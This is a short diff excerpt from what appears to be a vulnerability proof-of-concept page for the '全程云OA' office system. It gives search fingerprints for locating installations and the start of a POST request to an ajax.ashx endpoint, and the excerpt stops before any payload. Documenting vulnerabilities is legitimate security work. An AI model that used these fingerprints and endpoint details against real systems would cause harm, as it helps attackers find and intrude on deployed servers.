@@ -10,7 +10,7 @@ app:"全程云OA"
 ".passImg{background:url(images/yiyaoshi.png)"
 ```
 
-## poc
+## POC
 ```
 POST /OA/common/mod/ajax.ashx HTTP/1.1
 Host: 
